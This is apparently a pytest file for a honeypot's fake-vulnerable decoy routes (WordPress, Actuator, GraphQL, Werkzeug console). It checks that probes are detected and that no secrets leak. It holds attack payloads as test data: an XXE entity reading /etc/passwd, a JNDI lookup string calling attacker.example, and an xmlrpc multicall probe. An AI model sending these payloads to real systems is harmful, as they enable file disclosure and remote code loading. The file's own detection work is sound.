"""Fake-vulnerable-but-safe decoy routes (WordPress, Spring Boot Actuator,
GraphQL, Werkzeug debug console) -- detection-only, no inject_payload."""

from pathlib import Path

from app.storage import repository
from app.storage.db import get_connection

_ROUTES_DIR = Path(__file__).resolve().parent.parent / "app" / "routes"
_VULN_LOOKALIKE_ROUTE_FILES = (
    "decoy_wordpress.py",
    "decoy_actuator.py",
    "decoy_graphql.py",
    "decoy_debug_console.py",
)


def test_vuln_lookalike_route_files_never_call_inject_payload():
    for filename in _VULN_LOOKALIKE_ROUTE_FILES:
        text = (_ROUTES_DIR / filename).read_text()
        assert "import inject_payload" not in text, (
            f"{filename} is supposed to be detection-only -- it must never "
            f"import/call inject_payload"
        )


def _last_event_vuln_probe(session_id: str) -> bool:
    conn = get_connection()
    row = conn.execute(
        "SELECT vuln_probe_detected FROM events WHERE session_id = ? ORDER BY ts DESC LIMIT 1",
        (session_id,),
    ).fetchone()
    return bool(row["vuln_probe_detected"])


def test_wp_login_page_renders(client):
    response = client.get("/wp-login.php")
    assert response.status_code == 200
    assert "WordPress" in response.text


def test_wp_login_submit_always_fails_safely(client):
    response = client.post("/wp-login.php", data={"log": "admin", "pwd": "anything"})
    assert response.status_code == 200
    assert "Invalid username or password" in response.text


def test_wp_admin_redirects_to_login(client):
    response = client.get("/wp-admin/", follow_redirects=False)
    assert response.status_code in (302, 307)
    assert "/wp-login.php" in response.headers["location"]


def test_xmlrpc_multicall_probe_detected(client):
    response = client.post(
        "/xmlrpc.php",
        content=(
            "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall"
            "</methodName></methodCall>"
        ),
        headers={"Content-Type": "text/xml"},
    )
    assert response.status_code == 200
    assert "fault" in response.text.lower()

    session_id = client.cookies.get("hp_sid")
    assert session_id is not None
    assert _last_event_vuln_probe(session_id) is True

    session_row = repository.get_session(session_id)
    assert session_row["bot_score"] >= 3.0


def test_xmlrpc_xxe_probe_detected(client):
    response = client.post(
        "/xmlrpc.php",
        content='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall/>',
        headers={"Content-Type": "text/xml"},
    )
    assert response.status_code == 200
    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is True


def test_xmlrpc_ordinary_call_not_flagged(client):
    response = client.post(
        "/xmlrpc.php",
        content="<?xml version=\"1.0\"?><methodCall><methodName>demo.sayHello</methodName></methodCall>",
        headers={"Content-Type": "text/xml"},
    )
    assert response.status_code == 200
    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is False


def test_actuator_health_is_plain(client):
    response = client.get("/actuator/health")
    assert response.status_code == 200
    assert response.json() == {"status": "UP"}


def test_actuator_env_sanitizes_secrets(client):
    response = client.get("/actuator/env")
    assert response.status_code == 200
    body = response.text
    assert "REDACTED" not in body
    assert '"******"' in body
    # sanity: the property keys are still present so it still looks real
    assert "spring.datasource.password" in body
    assert "queeber.billing.api-key" in body


def test_actuator_env_jndi_header_detected(client):
    response = client.get(
        "/actuator/env",
        headers={"User-Agent": "${jndi:ldap://attacker.example/a}"},
    )
    assert response.status_code == 200
    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is True

    session_row = repository.get_session(session_id)
    assert session_row["bot_score"] >= 3.0


def test_actuator_heapdump_disabled(client):
    response = client.get("/actuator/heapdump")
    assert response.status_code == 404


def test_graphql_get_requires_post(client):
    response = client.get("/graphql")
    assert response.status_code == 400


def test_graphql_introspection_returns_minimal_schema_and_is_flagged(client):
    response = client.post("/graphql", json={"query": "{ __schema { queryType { name } } }"})
    assert response.status_code == 200
    body = response.json()
    assert "__schema" in body["data"]
    # No sensitive-sounding fields leak out.
    assert "password" not in response.text.lower()
    assert "secret" not in response.text.lower()

    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is True


def test_graphql_ordinary_query_not_flagged(client):
    response = client.post("/graphql", json={"query": "{ health }"})
    assert response.status_code == 200
    assert response.json() == {"data": {"health": "ok"}}
    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is False


def test_graphql_unknown_field_returns_generic_error(client):
    response = client.post("/graphql", json={"query": "{ adminResetPassword }"})
    assert response.status_code == 400
    assert "errors" in response.json()


def test_debug_console_page_renders(client):
    response = client.get("/console")
    assert response.status_code == 200
    assert "PIN" in response.text


def test_debug_console_pin_submission_always_fails_and_is_flagged(client):
    response = client.post("/console", data={"pin": "123-456-789"})
    assert response.status_code == 200
    assert "Wrong PIN" in response.text

    session_id = client.cookies.get("hp_sid")
    assert _last_event_vuln_probe(session_id) is True

    session_row = repository.get_session(session_id)
    assert session_row["bot_score"] >= 3.0
